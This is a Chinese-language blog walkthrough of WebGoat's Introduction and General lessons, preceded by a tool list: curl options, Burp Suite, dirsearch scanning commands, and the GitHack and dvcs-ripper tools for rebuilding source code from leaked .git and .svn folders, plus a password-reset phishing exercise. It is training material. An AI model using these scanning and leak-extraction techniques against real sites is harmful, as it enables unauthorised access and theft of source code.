<p>但是我会在步骤和代码的部分尽量解读（因为如果我也看不懂，我会花功夫讲透😭）</p>
</blockquote>
<p>参考资料：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37138074/article/details/128930146">WebGoat-8.2.2版靶机学习总结_webgoat8.2.2-CSDN博客</a></p>
<h2 id="常用命令和工具">常用命令和工具</h2>
<p>这里先给出解题比较常用的命令和工具（当然每题的解法多种多样，本人小白一个，我会尽力去找更多的解法的，如有不全，请多包涵）</p>
<blockquote>
<p>因为这里要用的工具我都自己有，需要的评论就行</p>
</blockquote>
<h3 id="0-翻译软件">0.翻译软件</h3>
<p>因为WebGoat都是英格力士，对于我这种英语不怎么行的还是得用翻译</p>
<p>我没有用goole，这里我只说edge和火狐</p>
<p>edge自带翻译功能，挺好用的，但是配合burp不如火狐简单（反正我没有配好就算了）</p>
<p>火狐需要下载插件，这里我推荐<code>twp</code>（Translate Web Pages),翻译速度还行（质量也就那样，所以翻译英格力士的能力还是得有的😥）</p>
<p><s>但是我最推荐的是英语和翻译一起看，会比较明朗</s></p>
<h3 id="1-curl">1.curl</h3>
<p>详情请点击<a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2019/09/curl-reference.html">这里</a></p>
<p>这里给出简单的命令集合</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line">-a/--append 上传文件时，附加到目标文件  </span><br><span class="line"></span><br><span class="line"> -A/--user-agent &lt;string&gt; 设置用户代理发送给服务器  </span><br><span class="line"></span><br><span class="line"> --anyauth 可以使用“任何”身份验证方法  </span><br><span class="line"></span><br><span class="line"> -b/--cookie &lt;name=string/file&gt; cookie 字符串或文件读取位置  </span><br><span class="line"></span><br><span class="line"> --basic 使用 HTTP 基本验证  </span><br><span class="line"></span><br><span class="line"> -B/--use-ascii 使用 ASCII /文本传输  </span><br><span class="line"></span><br><span class="line"> -c/--cookie-jar &lt;file&gt; 操作结束后把 cookie 写入到这个文件中  </span><br><span class="line"></span><br><span class="line"> -C/--continue-at &lt;offset&gt; 断点续转  </span><br><span class="line"></span><br><span class="line"> -d/--data &lt;data&gt; HTTP POST 方式传送数据  </span><br><span class="line"></span><br><span class="line"> --data-ascii &lt;data&gt; 以 ascii 的方式 post 数据  </span><br><span class="line"></span><br><span class="line"> --data-binary &lt;data&gt; 以二进制的方式 post 数据  </span><br><span class="line"></span><br><span class="line"> --negotiate 使用 HTTP 身份验证  </span><br><span class="line"></span><br><span class="line"> --digest 使用数字身份验证  </span><br><span class="line"></span><br><span class="line"> --disable-eprt 禁止使用 EPRT 或 LPRT  </span><br><span class="line"></span><br><span class="line"> --disable-epsv 禁止使用 EPSV  </span><br><span class="line"></span><br><span class="line"> -D/--dump-header &lt;file&gt; 把 header 信息写入到该文件中  </span><br><span class="line"></span><br><span class="line"> --egd-file &lt;file&gt; 为随机数据(SSL)设置 EGD socket 路径  </span><br><span class="line"></span><br><span class="line"> --tcp-nodelay 使用 TCP_NODELAY 选项  </span><br><span class="line"></span><br><span class="line"> -e/--referer 来源网址  </span><br><span class="line"></span><br><span class="line"> -E/--cert &lt;cert[:passwd]&gt; 客户端证书文件和密码 (SSL)  </span><br><span class="line"></span><br><span class="line"> --cert-type &lt;type&gt; 证书文件类型 (DER/PEM/ENG) (SSL)  </span><br><span class="line"></span><br><span class="line"> --key &lt;key&gt; 私钥文件名 (SSL)  </span><br><span class="line"></span><br><span class="line"> --key-type &lt;type&gt; 私钥文件类型 (DER/PEM/ENG) (SSL)  </span><br><span class="line"></span><br><span class="line"> --pass &lt;pass&gt; 私钥密码 (SSL)  </span><br><span class="line"></span><br><span class="line"> --engine &lt;eng&gt; 加密引擎使用 (SSL). &quot;--engine list&quot; for list  </span><br><span class="line"></span><br><span class="line"> --cacert &lt;file&gt; CA 证书 (SSL)  </span><br><span class="line"></span><br><span class="line"> --capath &lt;directory&gt; CA 目录 (made using c_rehash) to verify peer against (SSL)  </span><br><span class="line"></span><br><span class="line"> --ciphers &lt;list&gt; SSL 密码  </span><br><span class="line"></span><br><span class="line"> --compressed 要求返回是压缩的形势 (using deflate or gzip)  </span><br><span class="line"></span><br><span class="line"> --connect-timeout &lt;seconds&gt; 设置最大请求时间  </span><br><span class="line"></span><br><span class="line"> --create-dirs 建立本地目录的目录层次结构  </span><br><span class="line"></span><br><span class="line"> --crlf 上传是把 LF 转变成 CRLF  </span><br><span class="line"></span><br><span class="line"> -f/--fail 连接失败时不显示 http 错误  </span><br><span class="line"></span><br><span class="line"> --ftp-create-dirs 如果远程目录不存在，创建远程目录  </span><br><span class="line"></span><br><span class="line"> --ftp-method [multicwd/nocwd/singlecwd] 控制 CWD 的使用  </span><br><span class="line"></span><br><span class="line"> --ftp-pasv 使用 PASV/EPSV 代替端口  </span><br><span class="line"></span><br><span class="line"> --ftp-skip-pasv-ip 使用 PASV 的时候,忽略该 IP 地址  </span><br><span class="line"></span><br><span class="line"> --ftp-ssl 尝试用 SSL/TLS 来进行 ftp 数据传输  </span><br><span class="line"></span><br><span class="line"> --ftp-ssl-reqd 要求用 SSL/TLS 来进行 ftp 数据传输  </span><br><span class="line"></span><br><span class="line"> -F/--form &lt;name=content&gt; 模拟 http 表单提交数据  </span><br><span class="line"></span><br><span class="line"> -form-string &lt;name=string&gt; 模拟 http 表单提交数据  </span><br><span class="line"></span><br><span class="line"> -g/--globoff 禁用网址序列和范围使用&#123;&#125;和[]  </span><br><span class="line"></span><br><span class="line"> -G/--get 以 get 的方式来发送数据  </span><br><span class="line"></span><br><span class="line"> -h/--help 帮助  </span><br><span class="line"></span><br><span class="line"> -H/--header &lt;line&gt;自定义头信息传递给服务器  </span><br><span class="line"></span><br><span class="line"> --ignore-content-length 忽略的 HTTP 头信息的长度  </span><br><span class="line"></span><br><span class="line"> -i/--include 输出时包括 protocol 头信息  </span><br><span class="line"></span><br><span class="line"> -I/--head 只显示文档信息</span><br><span class="line"></span><br><span class="line">-j/--junk-session-cookies 读取文件进忽略 session cookie  </span><br><span class="line"></span><br><span class="line"> --interface &lt;interface&gt; 使用指定网络接口/地址  </span><br><span class="line"></span><br><span class="line"> --krb4 &lt;level&gt; 使用指定安全级别的 krb4  </span><br><span class="line"></span><br><span class="line"> -k/--insecure 允许不使用证书到 SSL 站点  </span><br><span class="line"></span><br><span class="line"> -K/--config 指定的配置文件读取  </span><br><span class="line"></span><br><span class="line"> -l/--list-only 列出 ftp 目录下的文件名称  </span><br><span class="line"></span><br><span class="line"> --limit-rate &lt;rate&gt; 设置传输速度  </span><br><span class="line"></span><br><span class="line"> --local-port&lt;NUM&gt; 强制使用本地端口号  </span><br><span class="line"></span><br><span class="line"> -m/--max-time &lt;seconds&gt; 设置最大传输时间  </span><br><span class="line"></span><br><span class="line"> --max-redirs &lt;num&gt; 设置最大读取的目录数  </span><br><span class="line"></span><br><span class="line"> --max-filesize &lt;bytes&gt; 设置最大下载的文件总量  </span><br><span class="line"></span><br><span class="line"> -M/--manual 显示全手动  </span><br><span class="line"></span><br><span class="line"> -n/--netrc 从 netrc 文件中读取用户名和密码  </span><br><span class="line"></span><br><span class="line"> --netrc-optional 使用 .netrc 或者 URL 来覆盖-n  </span><br><span class="line"></span><br><span class="line"> --ntlm 使用 HTTP NTLM 身份验证  </span><br><span class="line"></span><br><span class="line"> -N/--no-buffer 禁用缓冲输出  </span><br><span class="line"></span><br><span class="line"> -o/--output 把输出写到该文件中  </span><br><span class="line"></span><br><span class="line"> -O/--remote-name 把输出写到该文件中，保留远程文件的文件名  </span><br><span class="line"></span><br><span class="line"> -p/--proxytunnel 使用 HTTP 代理  </span><br><span class="line"></span><br><span class="line"> --proxy-anyauth 选择任一代理身份验证方法  </span><br><span class="line"></span><br><span class="line"> --proxy-basic 在代理上使用基本身份验证  </span><br><span class="line"></span><br><span class="line"> --proxy-digest 在代理上使用数字身份验证  </span><br><span class="line"></span><br><span class="line"> --proxy-ntlm 在代理上使用 ntlm 身份验证  </span><br><span class="line"></span><br><span class="line"> -P/--ftp-port &lt;address&gt; 使用端口地址，而不是使用 PASV  </span><br><span class="line"></span><br><span class="line"> -Q/--quote &lt;cmd&gt;文件传输前，发送命令到服务器  </span><br><span class="line"></span><br><span class="line"> -r/--range &lt;range&gt;检索来自 HTTP/1.1 或 FTP 服务器字节范围  </span><br><span class="line"></span><br><span class="line"> --range-file 读取（SSL）的随机文件  </span><br><span class="line"></span><br><span class="line"> -R/--remote-time 在本地生成文件时，保留远程文件时间  </span><br><span class="line"></span><br><span class="line"> --retry &lt;num&gt; 传输出现问题时，重试的次数  </span><br><span class="line"></span><br><span class="line"> --retry-delay &lt;seconds&gt; 传输出现问题时，设置重试间隔时间  </span><br><span class="line"></span><br><span class="line"> --retry-max-time &lt;seconds&gt; 传输出现问题时，设置最大重试时间  </span><br><span class="line"></span><br><span class="line"> -s/--silent 静音模式。不输出任何东西  </span><br><span class="line"></span><br><span class="line"> -S/--show-error 显示错误  </span><br><span class="line"></span><br><span class="line"> --socks4 &lt;host[:port]&gt; 用 socks4 代理给定主机和端口  </span><br><span class="line"></span><br><span class="line"> --socks5 &lt;host[:port]&gt; 用 socks5 代理给定主机和端口  </span><br><span class="line"></span><br><span class="line"> --stderr &lt;file&gt;  </span><br><span class="line"></span><br><span class="line"> -t/--telnet-option &lt;OPT=val&gt; Telnet 选项设置  </span><br><span class="line"></span><br><span class="line"> --trace &lt;file&gt; 对指定文件进行 debug  </span><br><span class="line"></span><br><span class="line"> --trace-ascii &lt;file&gt; Like --跟踪但没有 hex 输出  </span><br><span class="line"></span><br><span class="line"> --trace-time 跟踪/详细输出时，添加时间戳  </span><br><span class="line"></span><br><span class="line"> -T/--upload-file &lt;file&gt; 上传文件  </span><br><span class="line"></span><br><span class="line"> --url &lt;URL&gt; Spet URL to work with  </span><br><span class="line"></span><br><span class="line"> -u/--user &lt;user[:password]&gt;设置服务器的用户和密码  </span><br><span class="line"></span><br><span class="line"> -U/--proxy-user &lt;user[:password]&gt;设置代理用户名和密码  </span><br><span class="line"></span><br><span class="line"> -v/--verbose  </span><br><span class="line"></span><br><span class="line"> -V/--version 显示版本信息  </span><br><span class="line"></span><br><span class="line"> -w/--write-out [format]什么输出完成后  </span><br><span class="line"></span><br><span class="line"> -x/--proxy &lt;host[:port]&gt;在给定的端口上使用 HTTP 代理  </span><br><span class="line"></span><br><span class="line"> -X/--request &lt;command&gt;指定什么命令  </span><br><span class="line"></span><br><span class="line"> -y/--speed-time 放弃限速所要的时间。默认为 30  </span><br><span class="line"></span><br><span class="line"> -Y/--speed-limit 停止传输速度的限制，速度时间&#x27;秒  </span><br><span class="line"></span><br><span class="line"> -z/--time-cond 传送时间设置  </span><br><span class="line"></span><br><span class="line"> -0/--http1.0 使用 HTTP 1.0  </span><br><span class="line"></span><br><span class="line"> -1/--tlsv1 使用 TLSv1（SSL）  </span><br><span class="line"></span><br><span class="line"> -2/--sslv2 使用 SSLv2 的（SSL）  </span><br><span class="line"></span><br><span class="line"> -3/--sslv3 使用的 SSLv3（SSL）  </span><br><span class="line"></span><br><span class="line"> --3p-quote like -Q for the source URL for 3rd party transfer  </span><br><span class="line"></span><br><span class="line"> --3p-url 使用 url，进行第三方传送  </span><br><span class="line"></span><br><span class="line"> --3p-user 使用用户名和密码，进行第三方传送  </span><br><span class="line"></span><br><span class="line"> -4/--ipv4 使用 IP4  </span><br><span class="line"></span><br><span class="line"> -6/--ipv6 使用 IP6  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"> -#</span><span class="language-bash">/--progress-bar 用进度条显示当前的传送状态</span></span><br><span class="line"></span><br><span class="line">————</span><br><span class="line"></span><br><span class="line">后置：</span><br><span class="line"></span><br><span class="line">-v 显示详细信息（verbose 缩写），包括 IP 解析过程</span><br><span class="line"></span><br><span class="line">-i 显示头信息</span><br><span class="line"></span><br><span class="line">-I 只显示头信息</span><br></pre></td></tr></table></figure>
<h3 id="2-burp">2.burp</h3>
<p>这个很有用，集渗透，爆破等等一系列模块的软件，这里不多介绍，有兴趣可以去看国人写的介绍 👉<a target="_blank" rel="noopener" href="https://t0data.gitbooks.io/burpsuite/content/">Burp Suite 实战指南</a></p>
<blockquote>
<p>软件没有的话懒得去找可以留言找我，burp 实战指南 pdf 版我也有</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/crisprx/article/details/104181954">如何设置burp监听webgoat</a></p>
<p>主要步骤：<a target="_blank" rel="noopener" href="https://blog.csdn.net/crisprx/article/details/104181954">burpsuite无法捕捉localhost包的解决方法</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/7.png" alt=""></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/8.png" alt=""></p>
<h3 id="3-F12">3.F12</h3>
<p>浏览器 f12 自带的开发者模式,有关在客户端方面的很多都用开发者模式解决</p>
<h3 id="4-dirsearch">4.dirsearch</h3>
<p>dirsearch 是一个基于 python 的命令行工具，用于暴力扫描页面结构，包括网页中的目录和文件，用于探测 WEB 服务器下的****敏感文件/目录****的命令行工具。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">常用命令</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx //日常使用</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r //递归扫描，不过容易被检测</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r -t 30 //线程控制请求速率</span><br><span class="line"></span><br><span class="line">python dirsearch.py -u http://xxxx -r -t 30 --proxy 127.0.0.1:8080 //使用代理</span><br></pre></td></tr></table></figure>
<p>下载教程及说明 👉<a target="_blank" rel="noopener" href="https://www.nonevector.top/posts/18.html">点击直达</a></p>
<p>ps:网上一大坨教程我找了好久才找到有用的 😭</p>
<h3 id="5-GitHack">5.GitHack</h3>
<p>GitHack is a .git folder disclosure exploit.</p>
<p>It rebuild source code from .git folder while keep directory structure unchanged.</p>
<p>GitHack 是一个.git 泄露利用脚本，通过泄露的.git 文件夹下的文件，重建还原工程源代码。</p>
<p>渗透测试人员、攻击者，可以进一步审计代码，挖掘：文件上传，SQL 注射等 web 安全漏洞。</p>
<p>下载需要使用 git 命令</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/242540359">windows 下载 git</a></p>
<p>linux 系统下载 git 使用命令行<code>yum install git</code></p>
<p>然后在自己想要的文件位置使用命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/BugScanTeam/GitHack</span><br></pre></td></tr></table></figure>
<p>值得一提的是 GitHack 只能在 Python2 的环境下运行</p>
<h3 id="6-dvcs-ripper">6.dvcs-ripper</h3>
<p>泄露漏洞利用工具，在 linux 里面使用（可以找.svn，.hg 等等）</p>
<p>使用 git 下载</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git@github.com:kost/dvcs-ripper.git</span><br></pre></td></tr></table></figure>
<p>然后使用命令下载需要组件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</span><br></pre></td></tr></table></figure>
<p>即可</p>
<h3 id="7-password">7.password</h3>
<p>字典需要准备好，用于爆破</p>
<h3 id="8-编码-解码工具">8.编码/解码工具</h3>
<p>我个人用的是</p>
<p><a target="_blank" rel="noopener" href="https://www.toolhelper.cn/EncodeDecode/Base64EncodeDecode"> 在线工具 </a></p>
<p><a target="_blank" rel="noopener" href="http://www.atoolbox.net/">atoolbox</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cmd5.com/">md5在线解密破解</a>（用于hash）</p>
<p>当然这个自己随便自己找一个就行</p>
<h2 id="1-Introduction">1.Introduction</h2>
<h3 id="1-WebGoat">1.WebGoat</h3>
<blockquote>
<p>WebGoat is a deliberately insecure application that allows interested developers just like you to test vulnerabilities commonly found in Java-based applications that use common and popular open source components.</p>
<p>Now, while we in no way condone causing intentional harm to any animal, goat or otherwise, we think learning everything you can about security vulnerabilities is essential to understanding just what happens when even a small bit of unintended code gets into your applications.</p>
<p>What better way to do that than with your very own scapegoat?</p>
<p>Feel free to do what you will with him. Hack, poke, prod and if it makes you feel better, scare him until your heart’s content. Go ahead, and hack the goat. We promise he likes it.</p>
<p>Thanks for your interest!</p>
<p>The WebGoat Team</p>
<p>机翻：</p>
<p>WebGoat是一个故意不安全的应用程序，它允许像您一样感兴趣的开发人员测试在使用常见和流行的开源组件的基于java的应用程序中常见的漏洞。</p>
<p>现在，虽然我们绝不容忍对任何动物、山羊或其他动物造成故意伤害，但我们认为，了解有关安全漏洞的一切知识对于理解即使是一小部分意外代码进入应用程序时会发生什么也是必不可少的。</p>
<p>还有什么比找你自己的替罪羊更好的办法吗?</p>
<p>随你怎么处置他。砍啊，戳啊，戳啊，如果能让你感觉好点，就把他吓个半死。来吧，砍山羊。我们保证他会喜欢的。</p>
<p>谢谢你的关注!</p>
<p>WebGoat团队</p>
</blockquote>
<h3 id="2-WebWolf">2.WebWolf</h3>
<h4 id="1-Introducing-WebWolf">1.Introducing WebWolf</h4>
<blockquote>
<p>只有当课程指定您可以使用 WebWolf 时(一般右下角会有一头狼的图标，您才需要它。对于很多课程，您使用 WebGoat 而不使用 启动 WebWolf。如果您需要使用 WebWolf 进行练习，请确保它与 WebGoat 一起运行。</p>
<p>您也没有义务使用 WebWolf，您也可以使用您喜欢的任何拦截工具</p>
</blockquote>
<h4 id="2-Uploading-files">2.Uploading files</h4>
<p>教导如何上传文件</p>
<h4 id="3-Your-own-mailbox">3.Your own mailbox</h4>
<p>WebWolf提供邮箱客户端</p>
<p>随便输入什么都会在返回一封邮件</p>
<p>打开邮件后会有flag，输入就行（其实就是你的用户名反过来）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/2.png" alt="1"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/1.png" alt="1"></p>
<h4 id="4-Landing-page">4.Landing page</h4>
<blockquote>
<p>Suppose we tricked a user to click on a link he/she received in an email, this link will open up our crafted password reset link page. The user does not notice any differences compared to the normal password reset page of the company. The user enters a new password and hits enter. The new password will be sent to your host. In this case the new password will be sent to WebWolf. Try to locate the unique code.</p>
<p>Please be aware that after resetting the password the user will receive an error page. In a real attack scenario the user would probably see a normal success page (this is due to a limit what we can control with WebWolf)</p>
<p>假设我们诱骗用户点击他/她在电子邮件中收到的链接，此链接将打开我们精心制作的链接 密码重置链接页面。与公司的正常密码重置页面相比，用户没有注意到任何差异。 用户输入新密码并按回车键。新密码将发送给您的主机。在这种情况下，新的 密码将发送到 WebWolf。尝试找到唯一代码。</p>
<p>请注意，重置密码后，用户将收到一个错误页面。在实际攻击场景中， 用户可能会看到一个正常的成功页面（这是由于我们可以使用 WebWolf 控制的限制）</p>
</blockquote>
<p>点击蓝色的链接</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/3.png" alt="3"></p>
<p>随便输入密码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/4.png" alt="4"></p>
<p>密码会出现在url中以及flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/5.png" alt="5"></p>
<h2 id="2-General">2.General</h2>
<h3 id="1-HTTP-Basics">1.HTTP Basics</h3>
<p>这一部分介绍了http的GET方法和POST方法的区别，简单区分就是GET方法的参数直接通过url传递，POST的参数则通过包来传递。</p>
<h4 id="2">2</h4>
<p>该题看一下翻译叫我们输入名字就行了，没什么好说的</p>
<h4 id="3">3</h4>
<p>这题问上题http的methon是GET还是POST，url没变就是POST</p>
<p>然后问我们magic number ，这里就需要抓包了</p>
<p>打开burp开启拦截（没找到就Forward，一个一个看）就能找到</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/6.png" alt="6"></p>
<h3 id="2-HTTP-Proxies">2.HTTP Proxies</h3>
<p>这里主要介绍的是ZAP代理工具，因为我使用的是burp，所以不在介绍ZAP，有兴趣自行学习，我们直接跳到第6题</p>
<h4 id="6">6</h4>
<p>这题是要你修改请求包</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.Change the Method to GET </span><br><span class="line">2.Add a header &#x27;x-request-intercepted:true&#x27;</span><br><span class="line">3.Remove the request body and instead send &#x27;changeMe&#x27; as query string parameter and set the value to &#x27;Requests are tampered easily&#x27; (without the single quotes)</span><br><span class="line"></span><br><span class="line">把POST改成GET，添加头部x-request-intercepted:true，把changeMe的字符串改成Requests are tampered easily</span><br></pre></td></tr></table></figure>
<p>（下图未修改，修改仅仅是添加和修改，图片忘记保存了，不是很难就算了 <s>懒</s>）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/9.png" alt="9"></p>
<h3 id="3-Developer-Tools">3.Developer Tools</h3>
<p>这里介绍的是开发者工具，也就是F12，老样子我们直接跳到第4题和第6题</p>
<h4 id="4">4</h4>
<p>按照题意叫我们使用 ``webgoat.customjs.phoneHome()`函数就行了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/10.png" alt="10"></p>
<h4 id="6-2">6</h4>
<p>这题是要我们观察发送的请求包（点击go）</p>
<p>然后去网络的选项找network的包</p>
<p>请求里面有networkNum</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/11.png" alt="11"></p>
<h3 id="4-CIA-Triad">4.CIA Triad</h3>
<blockquote>
<p>The CIA Triad (confidentiality, integrity, availability) is a model for information security. The three elements of the triad are considered the most crucial information security components and should be guaranteed in any secure system.</p>
<p>CIA（保密性、完整性、可用性）是信息安全的典范。 三合会的三个要素被认为是最关键的信息安全组件，在任何安全系统中都应该得到保证</p>
</blockquote>
<h4 id="5">5</h4>
<p>这题不好做解释，我就放出答案吧</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/WebGoat/Introduction_General/12.png" alt="12"></p>
<h3 id="5-Crypto-Basics">5.Crypto Basics</h3>
<blockquote>
<p>This lesson explains different types of cryptography techniques that are commonly used in web applications.</p>
